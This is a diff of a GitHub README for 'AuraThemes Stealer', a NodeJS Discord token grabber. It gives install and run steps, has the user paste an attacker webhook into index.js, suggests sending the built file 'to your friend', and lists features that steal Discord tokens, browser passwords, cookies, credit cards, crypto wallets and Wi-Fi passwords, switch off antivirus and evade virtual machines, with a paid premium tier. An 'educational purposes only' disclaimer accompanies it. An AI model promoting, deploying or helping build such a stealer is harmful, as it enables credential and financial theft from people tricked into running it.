@@ -1,6 +1,20 @@
-# AuraThemes Stealer
+<div align="center">
+<a href="https://github.com/k4itrun/DiscordTokenGrabber/issues"><img src="https://img.shields.io/github/issues/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Issues"></a>
+<a href="https://github.com/k4itrun/DiscordTokenGrabber/blob/main/LICENSE"><img src="https://img.shields.io/github/license/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="MIT License"></a>
+<a href="https://github.com/k4itrun/DiscordTokenGrabber/stargazers"><img src="https://img.shields.io/github/stars/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Stargazers"></a>
+<a href="https://github.com/k4itrun/DiscordTokenGrabber/network/members"><img src="https://img.shields.io/github/forks/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Forks"></a>
+</div>
+<br>
 
-[Discord](https://discord.gg/gmGcexNxnU) | [Youtube](https://www.youtube.com/channel/UCYeaRFFvrE2MUPSUVpX-GCQ)
+<p align="center">
+    <img src="./assets/avatar.png" width=100  >
+</p>
+
+<h1 align="center">AuraThemes Stealer</h1>
+
+<p align="center">Discord Token Grabber written in NodeJS, which extracts all Discord Access Tokens, browsers, crypto wallets and PC information, from each user to each drive. (PoC. For educational purposes only)</p>
+
+---
 
 ## Description
 
@@ -12,53 +26,78 @@ This README provides a brief overview of what a token grabber is, its potential 
 
 Token grabbers work by intercepting and capturing tokens as they are transmitted between a client and a server. This interception can occur through various means, such as exploiting vulnerabilities, man-in-the-middle attacks, or through malicious software or scripts injected into a user's device.
 
-## Install
-- `git clone https://github.com/k4itrun/DiscordTokenGrabber.git`
-- `cd DiscordTokenGrabber`
+## Installation
+- Follow these steps so you can have it
+```bash
+git clone https://github.com/k4itrun/DiscordTokenGrabber.git
+```
+```bash
+cd DiscordTokenGrabber
+```
 
 > [!IMPORTANT]
 > Before running the `index.js` make sure you have to add your **webhook** at the top of the code in the `webhook` constant with that you will get the information sent to the webhook
 
-- `node index.js` 
+```bash
+node index.js
+```
+
+## Usage
+
+- *As I mentioned before (you have to add the webhook for the logs), so once you do that just run it*
+    - *In the `index.js` file on line (14) is the variable, paste your webhook inside, with that it will work, you can simply build the code and send it to your friend*
 
 ## Features
 
-*List of features of this simply easy token grabber*
+- List of features of this simply easy Token Grabber (✅).
+- List of features Premium (💜). 
 
-#### User actions
-
-| Action                    | Description                                      | Alert (Of each action) |
+| Action                    | Description                                      | Avatible |
 | --------------------------- | ------------------------------------------------ | -------------- |
-| `LOGIN`                     | Log in to discord                                | `✅ Yes`       |
-| `NAME`                 | Change username                                | `✅ Yes`       |
-| `CARD`             | Add credit card                            | `✅ Yes`        |
-| `PASSWORD`              | Change password                  | `✅ Yes`       |
-| `PAYPAL`                | Add paypal           | `✅ Yes`        |
-| `GMAIL`                | Change mail           | `✅ Yes`        |
-| `MFA2`                | Enabled or Disabled of MFA2           | `✅ Yes`        |
+| `LOGIN`                     | Log in to discord                                | ✅       |
+| `NAME`                 | Change username                                | ✅       |
+| `CARD`             | Add credit card                            | ✅        |
+| `PASSWORD`              | Change password                  | ✅       |
+| `PAYPAL`                | Add paypal           | ✅        |
+| `GMAIL`                | Change mail           | ✅        |
+| `MFA2`                | Enabled or Disabled of MFA2           | ✅        |
+| `TOKEN`                | Take all the initiated TOKENS           | ✅        |
+| `TOKEN`                | Takes all the INFO about the TOKENS           | ✅        |
+|                 | (Token, Badge(s), Email(s), Password(s), Nitro Type, Payment Methods and more...)           | ✅        |
+| `IP`                | Takes IP address (public)           | ✅        |
+| `IP LOCAL`                | Takes IP address (Local)           | ✅        |
+| `PC RAM`                | Takes RAM PC (KB)           | ✅        |
+| `PC UUID`                | Takes UUID PC           | ✅        |
+| `PC MAC`                | Takes Windows MAC address PC           | ✅        |
+| `PC CPU`                | Takes CPU Model PC           | ✅        |
+| `PC Windows Product`                | Takes Windows product key PC           | ✅        |
+| `PC Wifi Passwords`                | Takes ALL Wifi passwords (Only works on laptop)           | ✅        |
+| `Discord Backup Codes`                | It takes them on the first execution and when it does it again           | 💜        |
+| `Discord Bot Builder`                | Discord bot to create each unique key and to create executable files created in discord.js@14           | 💜        |
+| `API Rest`                | API in express to interact with the injection and have a unique key in each request           | 💜        |
+| `Cookie Stealer`                | Take all cookies from all browsers (chrome, edge, firefox, tor, etc...)           | 💜        |
+| `Password Stealer`                | Take all passwords from all browsers (chrome, edge, firefox, tor, etc...)           | 💜        |
+| `Credit Card(s) Stealer`                | Take all Credit Card(s) from all browsers (chrome, edge, firefox, tor, etc...)           | 💜        |
+| `AutoFill Stealer`                | Take all AutoFill from all browsers (chrome, edge, firefox, tor, etc...)           | 💜        |
+| `Social App(s)`                | Take all the records from social applications such as (discord, facebook, instagram, etc...)           | 💜        |
+| `History`                | Take all History from all browsers (chrome, edge, firefox, tor, etc...)           | 💜        |
+| `Download(s)`                | Gather each download from the victim's PC each downloaded file with the download origin source           | 💜        |
+| `Bookmark(s)`                | Taking all the possible browsers mentioned above           | 💜        |
+| `Client(s)`                | Filezilla and a lot more...           | 💜        |
+| `Game(s)`                | Minecraft, Roblox and a lot more...           | 💜        |
+| `Log(s)`                | Error log of some anti debuger action           | 💜        |
+| `Log(s)`                | Error log of some anti debuger action           | 💜        |
+| `PC Stealer`                | Takes data from the PC such as (antivirus (turns it off), passwords, clipboard, system info all, full screenshot etc...)           | 💜        |
+| `Wallets`                | Steal all cryptocurrency wallets bitcoin, ether, etc... (add an extension to chrome)           | 💜        |
+| `Anti VM`                | Does not run in virtual machines           | 💜        |
+| `Chrome Injection`                | Chrome Injection Bypass          | 💜        |
+| `Discord Injection`                | Alert for each action (login, change username/email/password/codes)          | 💜        |
+| `Browsers ALL`                |  Steal Browsers Credentials          | 💜        |
 
-#### First execution
+- If you want information about the premium version, contact me. 
 
-*When the user runs the main file*
-
-| Steal                    | Description                                      |
-| --------------------------- | ------------------------------------------------ |
-| `TOKEN`                | Take all the initiated TOKENS           |
-| `TOKEN`                | Takes all the INFO about the TOKENS           |
-|                 | (Token, Badge(s), Email(s), Password(s), Nitro Type, Payment Methods and more...)           |
-| `IP`                | Takes IP address (public)           |
-| `IP LOCAL`                | Takes IP address (Local)           |
-| `PC RAM`                | Takes RAM PC (KB)           |
-| `PC UUID`                | Takes UUID PC           |
-| `PC MAC`                | Takes Windows MAC address PC           |
-| `PC CPU`                | Takes CPU Model PC           |
-| `PC Windows Product`                | Takes Windows product key PC           |
-| `PC Wifi Passwords`                | Takes ALL Wifi passwords (Only works on laptop)           |
-
-
-This is the FREE version of **AuraThemes stealer** .
-
-## Features end
+## Preview
+- Coming soon...
 
 ## Disclaimer
 
